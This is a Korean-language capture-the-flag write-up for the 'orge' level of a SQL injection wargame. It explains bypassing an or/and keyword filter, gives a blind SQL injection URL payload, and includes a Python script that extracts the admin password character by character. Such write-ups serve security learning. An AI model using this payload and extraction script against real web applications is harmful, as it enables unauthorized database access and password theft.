<img width="180" alt="스크린샷 2020-01-16 오후 7 07 26" src="https://user-images.githubusercontent.com/54495632/72515580-7d320700-3893-11ea-8ccb-2f66c9e5b24d.png">

7번 ORGE

<img width="663" alt="스크린샷 2020-01-16 오후 7 07 37" src="https://user-images.githubusercontent.com/54495632/72515613-8b802300-3893-11ea-8f95-69eb51d0499a.png">

if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
or 과 and 가 필터링 되어있다 -> || &로 대체한다.

앞의 쿼리문을 이용하고 Blind SQL Injection이용하여
pw를 알아내서 알맞은 pw을 입력하면 해결되는 문제이다.
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge");

앞에서 나왔던 문제에서 and, or 필터링 조건이 붙은 것 같다.

pw의 length는 구하기가 비교적 간단하여 URL을 이용했고
pw의 값은 파이썬 requests를 이용하여 구하였다.

<img width="699" alt="스크린샷 2020-01-16 오후 7 29 57" src="https://user-images.githubusercontent.com/54495632/72517588-01d25480-3897-11ea-8482-c76621b475cc.png">

<img width="704" alt="스크린샷 2020-01-16 오후 7 30 08" src="https://user-images.githubusercontent.com/54495632/72517600-05fe7200-3897-11ea-89b2-cca41d47e1b8.png">

<img width="691" alt="스크린샷 2020-01-16 오후 7 30 20" src="https://user-images.githubusercontent.com/54495632/72517607-0860cc00-3897-11ea-9f11-f82e67b0b647.png">

다음과 같은 과정을 통해 pw의 길이 = 8임을 알아냈다.

파이썬을 이용해서 pw 값을 구했는데
ascii(substr()) , ascii(mid()) 같은 의미다.

pw=1%27||id=%27admin%27%26%26ascii(mid(pw,1,1))=55%23
ascii(mid(pw,1,1)) -> pw의 index 1부터 1글자의 아스키 코드값 

<img width="726" alt="스크린샷 2020-01-16 오후 7 40 56" src="https://user-images.githubusercontent.com/54495632/72518245-3b578f80-3898-11ea-9465-02c7cc72d75a.png">

<img width="292" alt="스크린샷 2020-01-16 오후 7 44 19" src="https://user-images.githubusercontent.com/54495632/72518465-c6388a00-3898-11ea-9970-b88df90d340e.png">

import requests

cookies={'PHPSESSID':'쿠키값'}
url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?"

pw=""
for i in range(1,9):
    for j in range(33,128):
        query="pw=1%27||id=%27admin%27%26%26ascii%28mid%28pw%2C"+str(i)+"%2C1%29%29%3D"+str(j)+"%23"
        geturl=url+query
        res=requests.get(geturl,cookies=cookies)
        if((res.text).find("Hello admin")>0):
            pw+=chr(j)
            print (pw)
            break

print ("finish pw :"+pw)



pw =7b751aec를 찾았다.

<img width="693" alt="스크린샷 2020-01-16 오후 7 47 23" src="https://user-images.githubusercontent.com/54495632/72518591-0a2b8f00-3899-11ea-8a0d-193f9b6029de.png">

다음과 같이 pw에 해당 값을 넣어주면 해결된다.